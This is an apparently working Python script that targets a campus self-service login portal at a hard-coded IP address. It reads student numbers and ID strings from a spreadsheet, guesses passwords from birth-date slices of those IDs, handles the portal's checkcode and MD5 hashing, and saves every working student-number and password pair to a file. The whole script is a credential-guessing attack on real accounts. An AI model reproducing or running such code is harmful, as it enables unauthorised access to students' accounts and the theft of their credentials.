import requests
import hashlib
import re
from bs4 import BeautifulSoup

count = 0
savePath = './er.in'
mFile = open(savePath,'w')   #用二进制写入 时会出现错误




def post(stunum,pwd):
	url = "http://210.30.1.114:8089/Self/nav_login"   #  登录界面
	urly = "http://210.30.1.114:8089/Self/RandomCodeAction.action"  #验证码get
	url1 = "http://210.30.1.114:8089/Self/LoginAction.action"  #登录post请求
	urlans = "http://210.30.1.114:8089/Self/nav_getUserInfo"


	#stunum = input("输入学号：")
	#pwd = input("输入密码：")
	pwd2=pwd
	#将密码进行md5加密
	tmp = hashlib.md5()
	tmp.update(pwd.encode("utf-8"))
	pwd=tmp.hexdigest()

	#首先get请求登录界面保存cookie，得到checkcode
	first = requests.get(url)
	cookie = first.cookies
	text = first.text
	pattern = re.compile(r'var checkcode="(\d+)"')
	match = pattern.search(text)
	checkcode = match.group(1)

	yanzheng = requests.get(url=urly,params={"randomNum":0.2197510044161448},cookies=cookie) # 所得cookie请求验证页面

	logind={
	    "account":stunum,
	    "password":pwd,
	    "code":'',
	    "checkcode":checkcode,
	    "Submit":"登 录"
	}


	denglu = requests.post(url1,data=logind,cookies=cookie)
	getnum = requests.post(urlans,cookies=cookie)

	soup = BeautifulSoup(getnum.text,"html.parser")
	ans = soup.findAll(name = "td",attrs={"class":"t_r1"})
	try:
		ans[2].string.strip()
		print("Yes")
		#print(stunum,pwd2)
		mstr = stunum+','+pwd2 +'\n'
		print(mstr)
		mFile.write(mstr) 
	except:
		pass
		#print("wrong")


import xlrd
fname = "./er.xlsx"
bk = xlrd.open_workbook(fname)
shx = range(bk.nsheets)
try:
	sh = bk.sheet_by_name("Sheet1")
except:
	print("ccc")

nr = sh.nrows
nc = sh.ncols

row_l = []

for i in range(0,nr):
	r_data = sh.row_values(i)
	row_l.append(r_data)

for i in row_l:
	#print(i[0])
	#print(i[1][6:14])
	#print(i[1][8:14])
	
	post(i[0],i[1][6:14])
	post(i[0],i[1][8:14])
#post("2015083211","19970924")


mFile.close()
print(count)

